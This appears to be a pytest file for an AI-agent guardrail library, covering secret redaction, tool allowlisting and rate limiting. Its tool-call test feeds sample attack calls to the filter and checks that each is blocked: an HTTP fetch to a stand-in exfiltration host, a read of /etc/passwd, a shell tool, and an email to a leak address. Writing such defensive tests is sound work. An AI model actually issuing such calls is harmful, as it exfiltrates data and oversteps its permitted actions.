import json

from shipguard.config import RateLimit, RateLimitConfig, ToolRule, ToolsConfig
from shipguard.ratelimit import RateLimiter
from shipguard.redact import Vault
from shipguard.tools_policy import filter_tool_calls, filter_tool_definitions
from shipguard.types import Finding


def test_vault_consistent_placeholders_and_selective_restore():
    v = Vault()
    t = "a@x.example and a@x.example and KEY1"
    f = [Finding("pii", "EMAIL", 0, 11, "a@x.example"), Finding("pii", "EMAIL", 16, 27, "a@x.example"),
         Finding("secrets", "API_KEY", 32, 36, "KEY1")]
    red = v.redact(t, f)
    assert red == "[[EMAIL_1]] and [[EMAIL_1]] and [[API_KEY_1]]"
    restored, n = v.restore(red, {"pii"})
    assert restored == "a@x.example and a@x.example and [[API_KEY_1]]" and n == 2
    assert v.restore("[[EMAIL_9]]", {"pii"}) == ("[[EMAIL_9]]", 0)


def _call(name, **args):
    return {"id": "c", "type": "function", "function": {"name": name, "arguments": json.dumps(args)}}


CFG = ToolsConfig(allowed=["http_get", "send_email", "search_docs"], allowed_hosts=["api.shipguard.example"],
                  rules={"send_email": ToolRule(allowed_recipient_domains=["shipguard.example"], max_calls=1),
                         "http_get": ToolRule(allowed_hosts=["docs.shipguard.example"])}, max_tool_calls=3)


def test_definitions_filtered():
    tools = [{"type": "function", "function": {"name": n}} for n in ["search_docs", "run_shell", "delete_records"]]
    kept, f = filter_tool_definitions(tools, CFG)
    assert [t["function"]["name"] for t in kept] == ["search_docs"]
    assert sorted(x.detail for x in f) == ["delete_records", "run_shell"]


def test_tool_calls_filtered_by_name_host_recipient_budget():
    calls = [_call("run_shell", cmd="ls"),
             _call("http_get", url="https://collector.evil.test/x"),
             _call("http_get", url="https://docs.shipguard.example/a"),
             _call("http_get", url="file:///etc/passwd"),
             _call("send_email", to="boss@shipguard.example", body="hi"),
             _call("send_email", to="ops@shipguard.example", body="again"),
             _call("send_email", to="leak@evil.test", body="x")]
    kept, f = filter_tool_calls(calls, CFG)
    assert [json.loads(c["function"]["arguments"]).get("url") or json.loads(c["function"]["arguments"]).get("to")
            for c in kept] == ["https://docs.shipguard.example/a", "boss@shipguard.example"]
    kinds = {x.kind for x in f}
    assert {"tool_not_allowed", "disallowed_host", "disallowed_scheme", "tool_budget_exceeded", "disallowed_recipient"} <= kinds


def test_rate_limiter_token_bucket():
    now = [0.0]
    rl = RateLimiter(RateLimitConfig(default=RateLimit(requests_per_minute=60, burst=2),
                                     routes={"/slow": RateLimit(requests_per_minute=6, burst=1)}), clock=lambda: now[0])
    assert rl.check("/x", "a")[0] and rl.check("/x", "a")[0]
    ok, retry = rl.check("/x", "a")
    assert not ok and 0 < retry <= 1.0
    assert rl.check("/x", "b")[0]            # per-client
    now[0] = 1.0
    assert rl.check("/x", "a")[0]            # refilled
    assert rl.check("/slow", "a")[0] and not rl.check("/slow", "a")[0]   # per-route
